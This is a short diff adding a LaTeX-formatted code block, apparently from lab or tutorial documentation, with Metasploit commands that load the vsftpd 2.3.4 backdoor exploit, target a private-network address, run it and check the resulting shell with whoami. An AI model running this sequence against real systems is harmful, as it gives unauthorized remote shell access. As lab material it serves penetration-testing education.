@@ -1,0 +1,7 @@
+\begin{Verbatim}[commandchars=\\\{\}]
+search vsftpd
+use exploit/unix/ftp/vsftpd\PYGZus{}234\PYGZus{}backdoor
+\PYG{n+nb}{set} rhosts \PYG{l+m}{192}.168.0.184
+exploit
+whoami
+\end{Verbatim}
